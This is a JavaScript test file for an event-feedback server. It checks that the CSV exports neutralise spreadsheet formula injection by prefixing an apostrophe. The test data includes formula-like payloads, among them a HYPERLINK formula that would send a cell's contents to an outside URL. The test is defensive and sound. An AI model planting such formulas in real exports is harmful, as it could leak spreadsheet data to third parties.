import { once } from 'node:events';
import { afterAll, beforeAll, describe, expect, it, vi } from 'vitest';
import { db, query } from '../src/db/pool.js';
import { runMigrations, seedDefaultData } from '../src/db/bootstrap.js';
import { app } from '../src/server.js';
import { freshSetupCode } from './support/setupCode.js';

vi.mock('../src/db/pool.js', async () => {
  const { createPglitePool } = await import('./support/pglitePool.js');
  return createPglitePool();
});

let server;
let baseUrl;
let ownerCookie;
let event;

async function request(method, path, { body, cookie } = {}) {
  const response = await fetch(`${baseUrl}${path}`, {
    method,
    headers: { 'content-type': 'application/json', ...(cookie ? { cookie } : {}) },
    body: body === undefined ? undefined : JSON.stringify(body)
  });
  return {
    status: response.status,
    body: await response.json(),
    cookie: response.headers.get('set-cookie')?.split(';')[0] ?? null
  };
}

async function download(path) {
  const response = await fetch(`${baseUrl}/admin/events/${event.id}${path}`, { headers: { cookie: ownerCookie } });
  expect(response.status).toBe(200);
  return response.text();
}

describe('the CSV exports of an event', () => {
  beforeAll(async () => {
    await runMigrations();
    await seedDefaultData();
    server = app.listen(0);
    await once(server, 'listening');
    baseUrl = `http://127.0.0.1:${server.address().port}`;
    const setup = await request('POST', '/admin/setup/first-admin', {
      body: { setupCode: await freshSetupCode(), name: 'Owner', email: 'owner@example.test', password: 'test-password-123', organizationName: 'HSP-Events' }
    });
    expect(setup.status).toBe(201);
    ownerCookie = setup.cookie;

    const created = await request('POST', '/admin/events', {
      cookie: ownerCookie,
      body: { name: '+++ Silvester +++', dateFrom: new Date(Date.now() - 86_400_000).toISOString(), eventTimezone: 'Europe/Berlin' }
    });
    expect(created.status).toBe(201);
    event = (await query('SELECT * FROM events WHERE id = $1', [created.body.id])).rows[0];

    // An event manager names the key of a question, and the key heads its column in the export.
    const form = (await query('SELECT id FROM feedback_forms WHERE event_id = $1 ORDER BY created_at LIMIT 1', [event.id])).rows[0];
    const question = await request('POST', `/admin/forms/${form.id}/questions`, {
      cookie: ownerCookie,
      body: { questionType: 'text_short', internalName: '=frage', label: 'Was sollen wir uns merken?' }
    });
    expect(question.status).toBe(201);

    const sent = await request('POST', `/public/events/${event.event_feedback_token}/feedback`, {
      body: {
        rating: 4,
        startedAt: '2026-01-01T00:00:00.000Z',
        generalComment: '=HYPERLINK("https://example.test/?d="&A1;"Mehr")',
        commentPositive: '@SUMME(1+1)',
        commentImprovement: '-2+3',
        newsletterOptin: true,
        newsletterEmail: '+gast@example.de',
        answers: { '=frage': 'Die Zugabe' }
      }
    });
    expect(sent.status).toBe(201);
  }, 60_000);

  afterAll(async () => {
    server?.close();
    await db.close();
  });

  it('puts an apostrophe in front of guest text that starts like a formula', async () => {
    const csv = await download('/export.csv');

    expect(csv).toContain(`"'=HYPERLINK(""https://example.test/?d=""&A1;""Mehr"")"`);
    expect(csv).toContain(`"'@SUMME(1+1)"`);
    expect(csv).toContain(`"'-2+3"`);
    expect(csv).toContain(`"'+++ Silvester +++"`);
    expect(csv).toContain('"4"');
  });

  it('puts the apostrophe in front of a column heading from a question key', async () => {
    const [header, row] = (await download('/export.csv')).replace(/^\u{feff}/u, '').split('\n');

    expect(header.split(',')).toContain(`"'=frage"`);
    expect(header.split(',')).toContain('"general_comment"');
    // The answer is stored as JSON and starts with its quote.
    expect(row).toContain('"""Die Zugabe"""');
  });

  it('puts the apostrophe in front of a newsletter address that starts like a formula', async () => {
    const csv = await download('/newsletter.csv');

    expect(csv).toContain(`"'+gast@example.de"`);
    expect(csv).toContain(`"'+++ Silvester +++"`);
  });
});
